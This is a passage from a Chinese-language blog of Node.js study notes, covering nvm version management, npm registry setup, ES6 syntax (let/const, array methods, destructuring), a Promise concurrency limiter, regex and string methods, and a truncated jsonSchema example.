<h2 id="3-nvm-多版本管理"><a href="#3-nvm-多版本管理" class="headerlink" title="3. nvm 多版本管理"></a>3. nvm 多版本管理</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">自行安装nvm，archlinux上可以在archlinuxcn中找到包</span></span><br><span class="line">sudo pacman -S nvm</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列举可以安装的版本</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">--lts 只列举长期维护版本</span></span><br><span class="line">nvm ls-remote</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列举本机版本</span></span><br><span class="line">nvm list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装一个版本</span></span><br><span class="line">nvm install v12.22.10</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载一个版本</span></span><br><span class="line">nvm uninstall v12.22.10</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用一个版本</span></span><br><span class="line">nvm use v12.22.10</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用默认版本</span></span><br><span class="line">nvm use default</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置默认版本</span></span><br><span class="line">nvm alias default v12.22.10</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设置默认为最新版本</span></span><br><span class="line">nvm alias default node</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">给某个版本起别名</span></span><br><span class="line">nvm alias xxx v1.1.1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">回归系统的node</span></span><br><span class="line">nvm deactive</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">不使用nvm</span></span><br><span class="line">nvm unload</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重新使用nvm</span></span><br><span class="line">source /usr/share/nvm/init-nvm.sh</span><br></pre></td></tr></table></figure>

<h2 id="4-配置源"><a href="#4-配置源" class="headerlink" title="4. 配置源"></a>4. 配置源</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>

<p><strong>配置源不生效</strong></p>
<ul>
<li>当前目录有<code>package-lock.json</code>文件，删掉就好了</li>
</ul>
<h1 id="三、语法相关-ES6"><a href="#三、语法相关-ES6" class="headerlink" title="三、语法相关(ES6)"></a>三、语法相关(ES6)</h1><h2 id="1-变量"><a href="#1-变量" class="headerlink" title="1. 变量"></a>1. 变量</h2><h3 id="1-1-let和var的区别"><a href="#1-1-let和var的区别" class="headerlink" title="1.1. let和var的区别"></a>1.1. let和var的区别</h3><table>
<thead>
<tr>
<th></th>
<th>var</th>
<th>let</th>
</tr>
</thead>
<tbody><tr>
<td>作用域</td>
<td>var可以全局使用</td>
<td>let只能在代码块中</td>
</tr>
<tr>
<td>未定义使用</td>
<td>定义前使用var，会是undefined类型</td>
<td>定义前使用，会报错</td>
</tr>
</tbody></table>
<p>let特性</p>
<ul>
<li>同作用域下，let前所有调用变量的行为都报错，包括typeof</li>
<li>let要求有大括号，不允许类似if只有一条语句不加大括号</li>
</ul>
<h3 id="1-2-const类型"><a href="#1-2-const类型" class="headerlink" title="1.2. const类型"></a>1.2. const类型</h3><ul>
<li>大部分同let，有块作用域和不可声明前调用</li>
</ul>
<h2 id="2-Array-数组"><a href="#2-Array-数组" class="headerlink" title="2. Array 数组"></a>2. Array 数组</h2><h3 id="2-1-一些基础操作"><a href="#2-1-一些基础操作" class="headerlink" title="2.1. 一些基础操作"></a>2.1. 一些基础操作</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/****** 删除 ******/</span></span><br><span class="line"><span class="comment">// 删除头部元素并返回</span></span><br><span class="line"><span class="keyword">let</span> head = arr.<span class="title function_">shift</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除所有xxxId</span></span><br><span class="line"><span class="keyword">let</span> tempIndex = arr.<span class="title function_">indexOf</span>(xxxId);</span><br><span class="line"><span class="keyword">while</span> (tempIndex !== -<span class="number">1</span>) &#123;</span><br><span class="line">    arr.<span class="title function_">splice</span>(tempIndex, <span class="number">1</span>);</span><br><span class="line">    tempIndex = arr.<span class="title function_">indexOf</span>(xxxId);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/****** 新增 ******/</span></span><br><span class="line"><span class="comment">// 插入到数组前面并返回长度</span></span><br><span class="line"><span class="keyword">let</span> len = arr.<span class="title function_">unshift</span>(<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/****** 遍历 ******/</span></span><br><span class="line"><span class="comment">// 不需要index，for of结构，返回只有数组的value</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> v <span class="keyword">of</span> obj) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`value: <span class="subst">$&#123;v&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-数组去重"><a href="#2-2-数组去重" class="headerlink" title="2.2. 数组去重"></a>2.2. 数组去重</h3><ul>
<li>Set对象类似于数组，但是元素唯一，对数组去重可以使用Set来实现</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">arr = <span class="title class_">Array</span>.<span class="title function_">from</span>(<span class="keyword">new</span> <span class="title class_">Set</span>(arr));</span><br></pre></td></tr></table></figure>

<h3 id="2-3-map-遍历数组返回新的数组"><a href="#2-3-map-遍历数组返回新的数组" class="headerlink" title="2.3. map 遍历数组返回新的数组"></a>2.3. map 遍历数组返回新的数组</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt; <span class="keyword">let</span> arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>];</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">&gt; <span class="keyword">let</span> b = arr.<span class="title function_">map</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123;<span class="keyword">if</span> (item &lt; <span class="number">3</span>) &#123;<span class="keyword">return</span> <span class="literal">undefined</span>;&#125; <span class="keyword">return</span> item+<span class="number">1</span>;&#125;)</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">&gt; b</span><br><span class="line">[ <span class="literal">undefined</span>, <span class="literal">undefined</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span> ]</span><br></pre></td></tr></table></figure>

<h3 id="2-4-filter-遍历数组筛选"><a href="#2-4-filter-遍历数组筛选" class="headerlink" title="2.4. filter 遍历数组筛选"></a>2.4. filter 遍历数组筛选</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt; <span class="keyword">let</span> b = [ <span class="literal">undefined</span>, <span class="literal">undefined</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span> ]</span><br><span class="line">[ <span class="literal">undefined</span>, <span class="literal">undefined</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span> ]</span><br><span class="line">&gt; b.<span class="title function_">filter</span>(<span class="function">(<span class="params">item</span>) =&gt;</span> &#123; <span class="keyword">return</span> item != <span class="literal">undefined</span>; &#125;)</span><br><span class="line">[ <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span> ]</span><br></pre></td></tr></table></figure>

<h3 id="2-5-reduce-遍历数组累加"><a href="#2-5-reduce-遍历数组累加" class="headerlink" title="2.5. reduce 遍历数组累加"></a>2.5. reduce 遍历数组累加</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt; <span class="keyword">let</span> b = [ <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span> ]</span><br><span class="line">[ <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span> ]</span><br><span class="line">&gt; b.<span class="title function_">reduce</span>(<span class="function">(<span class="params">pre, item</span>) =&gt;</span> &#123; <span class="keyword">return</span> pre+item; &#125;)</span><br><span class="line"><span class="number">30</span></span><br></pre></td></tr></table></figure>

<h2 id="3-对象"><a href="#3-对象" class="headerlink" title="3. 对象"></a>3. 对象</h2><h3 id="3-1-一些基本操作"><a href="#3-1-一些基本操作" class="headerlink" title="3.1. 一些基本操作"></a>3.1. 一些基本操作</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/****** 遍历对象 ******/</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line"><span class="comment">// 简单写如下，但是eslint扫描过不了</span></span><br><span class="line"><span class="comment">// 返回的是对象的key或者数组的index</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> k <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`key: <span class="subst">$&#123;k&#125;</span>, value: <span class="subst">$&#123;obj[k]&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 下面是官方要求写法</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> k <span class="keyword">of</span> <span class="title class_">Object</span>.<span class="title function_">keys</span>(obj)) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`key: <span class="subst">$&#123;k&#125;</span>, value: <span class="subst">$&#123;obj[k]&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-2-解构对象"><a href="#3-2-解构对象" class="headerlink" title="3.2. 解构对象"></a>3.2. 解构对象</h3><p><strong>基本赋值</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> o = &#123; <span class="attr">p</span>: <span class="number">42</span>, <span class="attr">q</span>: tru e&#125;;</span><br><span class="line"><span class="keyword">let</span> &#123; p, q &#125; = o;</span><br></pre></td></tr></table></figure>

<p><strong>无声明赋值</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a, b;</span><br><span class="line">(&#123;a, b&#125; = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: <span class="number">2</span>&#125;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注意：赋值语句周围的圆括号 ( ... ) 在使用对象字面量无声明解构赋值时是必须的。</span><br><span class="line">&#123;a, b&#125; = &#123;a: 1, b: 2&#125; 不是有效的独立语法，因为左边的 &#123;a, b&#125; 被认为是一个块而不是对象字面量。</span><br><span class="line">然而，(&#123;a, b&#125; = &#123;a: 1, b: 2&#125;) 是有效的，正如 var &#123;a, b&#125; = &#123;a: 1, b: 2&#125;</span><br><span class="line">你的 ( ... ) 表达式之前需要有一个分号，否则它可能会被当成上一行中的函数执行。</span><br></pre></td></tr></table></figure>

<p><strong>给新的变量名赋值</strong></p>
<p>可以从一个对象中提取变量并赋值给和对象属性名不同的新的变量名。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> o = &#123; <span class="attr">p</span>: <span class="number">42</span>, <span class="attr">q</span>: <span class="literal">true</span> &#125;;</span><br><span class="line"><span class="keyword">let</span> &#123; <span class="attr">p</span>: foo, <span class="attr">q</span>: bar &#125; = o;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo); <span class="comment">// 42</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(bar); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p><strong>默认值</strong></p>
<p>变量可以先赋予默认值。当要提取的对象对应属性解析为 undefined，变量就被赋予默认值。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123; a = <span class="number">10</span>, b = <span class="number">5</span> &#125; = &#123; <span class="attr">a</span>: <span class="number">3</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a); <span class="comment">// 3</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b); <span class="comment">// 5</span></span><br></pre></td></tr></table></figure>

<h3 id="3-3-变量作为key"><a href="#3-3-变量作为key" class="headerlink" title="3.3. 变量作为key"></a>3.3. 变量作为key</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="string">&#x27;aaaaa&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> data = &#123;</span><br><span class="line">    [a]: <span class="number">1</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="4-异步处理"><a href="#4-异步处理" class="headerlink" title="4. 异步处理"></a>4. 异步处理</h2><h3 id="4-1-Promise"><a href="#4-1-Promise" class="headerlink" title="4.1. Promise"></a>4.1. Promise</h3><h4 id="4-1-1-Promise-all"><a href="#4-1-1-Promise-all" class="headerlink" title="4.1.1 Promise.all"></a>4.1.1 Promise.all</h4><ul>
<li><code>Promise.all()</code>主要用于将多个异步处理函数整合成一个异步处理，外层使用await可以等待多个异步处理函数处理完成</li>
</ul>
<p><strong>1. 和数组结合</strong></p>
<ul>
<li>数组遍历每一个item进行处理，如果处理之间不相关，可以使用异步的方式，但是又需要等待处理完成</li>
<li>不能使用foreach，因为<code>Promise.all</code>依赖返回的Promise对象，foreach是没有返回的</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> testArray = [];</span><br><span class="line">...</span><br><span class="line"><span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>(testArray.<span class="title function_">map</span>(<span class="keyword">async</span> (item) =&gt; &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>

<p><strong>2. 限制并发数</strong></p>
<ul>
<li>如果使用数组的map进行遍历，如果数组元素个数特别多，可能会导致协程个数特别多</li>
<li>需要对<code>Promise.all()</code>加上数量限制，仅允许一定数量的协程</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 用法</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">const limit = new PromiseLimit(200);</span></span><br><span class="line"><span class="comment">await Promise.all(vpnUsers.map((user) =&gt; &#123;</span></span><br><span class="line"><span class="comment">    return limit.build(async () =&gt; &#123;</span></span><br><span class="line"><span class="comment">        ...</span></span><br><span class="line"><span class="comment">    &#125;);</span></span><br><span class="line"><span class="comment">&#125;));</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PromiseLimit</span> &#123;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">n</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">limit</span> = n;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">count</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">queue</span> = [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">enqueue</span>(<span class="params">fn</span>) &#123;</span><br><span class="line">        <span class="comment">// 关键代码: fn, resolve, reject 统一管理</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">queue</span>.<span class="title function_">push</span>(&#123; fn, resolve, reject &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">dequeue</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">count</span> &lt; <span class="variable language_">this</span>.<span class="property">limit</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">queue</span>.<span class="property">length</span>) &#123;</span><br><span class="line">            <span class="comment">// 等到 Promise 计数器小于阈值时，则出队执行</span></span><br><span class="line">            <span class="keyword">const</span> &#123; fn, resolve, reject &#125; = <span class="variable language_">this</span>.<span class="property">queue</span>.<span class="title function_">shift</span>();</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">run</span>(fn).<span class="title function_">then</span>(resolve).<span class="title function_">catch</span>(reject);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// async/await 简化错误处理</span></span><br><span class="line">    <span class="keyword">async</span> <span class="title function_">run</span>(<span class="params">fn</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">count</span>++;</span><br><span class="line">        <span class="comment">// 维护一个计数器</span></span><br><span class="line">        <span class="keyword">let</span> value;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            value = <span class="keyword">await</span> <span class="title function_">fn</span>();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">count</span>--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 执行完，看看队列有东西没</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">dequeue</span>();</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">build</span>(<span class="params">fn</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">count</span> &lt; <span class="variable language_">this</span>.<span class="property">limit</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果没有到达阈值，直接执行</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">run</span>(fn);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 如果超出阈值，则先扔到队列中，等待有空闲时执行</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">enqueue</span>(fn);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title class_">PromiseLimit</span>;</span><br></pre></td></tr></table></figure>

<h2 id="5-regExp-正则"><a href="#5-regExp-正则" class="headerlink" title="5. regExp 正则"></a>5. regExp 正则</h2><h3 id="5-1-test-测试正则"><a href="#5-1-test-测试正则" class="headerlink" title="5.1. test 测试正则"></a>5.1. test 测试正则</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> binStrReg = <span class="regexp">/^\\[0-9a-fA-F]&#123;2&#125;$/</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(binStrReg.<span class="title function_">test</span>(<span class="string">&#x27;aa&#x27;</span>));      <span class="comment">// false</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(binStrReg.<span class="title function_">test</span>(<span class="string">&#x27;\\aa&#x27;</span>));    <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<h3 id="5-2-exec-匹配返回符合要求的字符串"><a href="#5-2-exec-匹配返回符合要求的字符串" class="headerlink" title="5.2. exec 匹配返回符合要求的字符串"></a>5.2. exec 匹配返回符合要求的字符串</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;aaabbbaaaccc&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> reg = <span class="regexp">/aaa/</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(reg.<span class="title function_">exec</span>(str));   <span class="comment">// [ &#x27;aaa&#x27;, index: 0, input: &#x27;aaabbbaaaccc&#x27;, groups: undefined ]</span></span><br></pre></td></tr></table></figure>

<ul>
<li>exec只返回第一个，想要返回全部，需要使用while和g来实现</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;aaabbbaaaccc&#x27;</span>;</span><br><span class="line"><span class="keyword">let</span> reg = <span class="regexp">/aaa/g</span>;</span><br><span class="line"><span class="keyword">while</span>(res = reg.<span class="title function_">exec</span>(str))&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// [ &#x27;aaa&#x27;, index: 0, input: &#x27;aaabbbaaaccc&#x27;, groups: undefined ]</span></span><br><span class="line"><span class="comment">// [ &#x27;aaa&#x27;, index: 6, input: &#x27;aaabbbaaaccc&#x27;, groups: undefined ]</span></span><br></pre></td></tr></table></figure>

<h2 id="6-字符串操作"><a href="#6-字符串操作" class="headerlink" title="6. 字符串操作"></a>6. 字符串操作</h2><h3 id="6-1-正则"><a href="#6-1-正则" class="headerlink" title="6.1. 正则"></a>6.1. 正则</h3><h4 id="match-匹配输出"><a href="#match-匹配输出" class="headerlink" title="match 匹配输出"></a>match 匹配输出</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;aaabbbaaaccc&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">match</span>(<span class="regexp">/aaa/</span>));      <span class="comment">// [ &#x27;aaa&#x27;, index: 0, input: &#x27;aaabbbaaaccc&#x27;, groups: undefined ]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">match</span>(<span class="regexp">/aaa/g</span>));     <span class="comment">// [ &#x27;aaa&#x27;, &#x27;aaa&#x27; ]</span></span><br></pre></td></tr></table></figure>

<h4 id="search-匹配输出索引"><a href="#search-匹配输出索引" class="headerlink" title="search 匹配输出索引"></a>search 匹配输出索引</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;aaabbbaaaccc&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">search</span>(<span class="regexp">/bbb/</span>));      <span class="comment">// 3</span></span><br></pre></td></tr></table></figure>

<h4 id="replace-替换"><a href="#replace-替换" class="headerlink" title="replace 替换"></a>replace 替换</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;aaabbbaaaccc&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">replace</span>(<span class="regexp">/aaa/</span>, <span class="string">&#x27;lll&#x27;</span>));     <span class="comment">// lllbbbaaaccc</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">replace</span>(<span class="regexp">/aaa/g</span>, <span class="string">&#x27;lll&#x27;</span>));    <span class="comment">// lllbbblllccc</span></span><br></pre></td></tr></table></figure>

<h4 id="split-字符串分割"><a href="#split-字符串分割" class="headerlink" title="split 字符串分割"></a>split 字符串分割</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;aaa,bbb|aaa ccc#sss@uuu&amp;ccc&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">split</span>(<span class="regexp">/[,| #@&amp;]/</span>));         <span class="comment">// [ &#x27;aaa&#x27;, &#x27;bbb&#x27;, &#x27;aaa&#x27;, &#x27;ccc&#x27;, &#x27;sss&#x27;, &#x27;uuu&#x27;, &#x27;ccc&#x27; ]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">split</span>(<span class="regexp">/[,| #@&amp;]/</span>, <span class="number">3</span>));      <span class="comment">// [ &#x27;aaa&#x27;, &#x27;bbb&#x27;, &#x27;aaa&#x27; ]</span></span><br></pre></td></tr></table></figure>

<h3 id="6-2-字符串切割"><a href="#6-2-字符串切割" class="headerlink" title="6.2. 字符串切割"></a>6.2. 字符串切割</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> str = <span class="string">&#x27;abcdefghi&#x27;</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">slice</span>(-<span class="number">4</span>));     <span class="comment">// fghi</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">slice</span>(<span class="number">0</span>, -<span class="number">4</span>));  <span class="comment">// abcde</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">3</span>));   <span class="comment">// abc</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str.<span class="title function_">slice</span>(-<span class="number">4</span>, -<span class="number">2</span>)); <span class="comment">// fg</span></span><br></pre></td></tr></table></figure>

<h3 id="6-3-join-使用间隔将字符串数组转字符串"><a href="#6-3-join-使用间隔将字符串数组转字符串" class="headerlink" title="6.3. join 使用间隔将字符串数组转字符串"></a>6.3. join 使用间隔将字符串数组转字符串</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&gt; <span class="keyword">let</span> str = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>]</span><br><span class="line"><span class="literal">undefined</span></span><br><span class="line">&gt; str.<span class="title function_">join</span>(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;a#b#c&#x27;</span></span><br></pre></td></tr></table></figure>

<h2 id="7-引用json文件"><a href="#7-引用json文件" class="headerlink" title="7. 引用json文件"></a>7. 引用json文件</h2><ul>
<li>直接引用相对路径的文件即可，加不加后缀一样，会变成对象存到变量中</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> testJson = <span class="built_in">require</span>(<span class="string">&#x27;./aaa&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(testJson);</span><br></pre></td></tr></table></figure>

<h2 id="8-类型转换"><a href="#8-类型转换" class="headerlink" title="8. 类型转换"></a>8. 类型转换</h2><h3 id="8-1-float到其他"><a href="#8-1-float到其他" class="headerlink" title="8.1. float到其他"></a>8.1. float到其他</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> intVar = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">2.3</span>);   <span class="comment">// 向下取整</span></span><br><span class="line"><span class="keyword">let</span> intVar1 = <span class="title class_">Math</span>.<span class="title function_">ceil</span>(<span class="number">3.2</span>);   <span class="comment">// 向上取整</span></span><br></pre></td></tr></table></figure>

<h1 id="四、技巧"><a href="#四、技巧" class="headerlink" title="四、技巧"></a>四、技巧</h1><h2 id="1-框架"><a href="#1-框架" class="headerlink" title="1. 框架"></a>1. 框架</h2><ul>
<li>服务端后台框架推荐<a href="https://eggjs.org/zh-cn/">eggjs</a></li>
</ul>
<h2 id="2-交换元素的值"><a href="#2-交换元素的值" class="headerlink" title="2. 交换元素的值"></a>2. 交换元素的值</h2><ul>
<li>使用ES6的解构赋值特性</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">let</span> y = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">[x, y] = [y, x];</span><br></pre></td></tr></table></figure>

<h2 id="3-jsonSchema的几种用法"><a href="#3-jsonSchema的几种用法" class="headerlink" title="3. jsonSchema的几种用法"></a>3. jsonSchema的几种用法</h2><h3 id="3-1-required依赖某一项"><a href="#3-1-required依赖某一项" class="headerlink" title="3.1. required依赖某一项"></a>3.1. required依赖某一项</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> xxxSchema = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;xxx配置&#x27;</span>,</span><br><span class="line">    <span class="attr">type</span>: <span class="string">&#x27;object&#x27;</span>,</span><br><span class="line">    <span class="attr">required</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">properties</span>: &#123;</span><br><span class="line">        <span class="attr">test</span>: &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;xxxxx&#x27;</span>,</span><br><span class="line">            <span class="attr">type</span>: <span class="string">&#x27;object&#x27;</span>,</span><br><span class="line">            <span class="attr">required</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="attr">properties</span>: &#123;</span><br><span class="line">                <span class="attr">enable</span>: &#123;</span><br><span class="line">                    <span class="attr">name</span>: <span class="string">&#x27;enable&#x27;</span>,</span><br><span class="line">                    <span class="attr">type</span>: <span 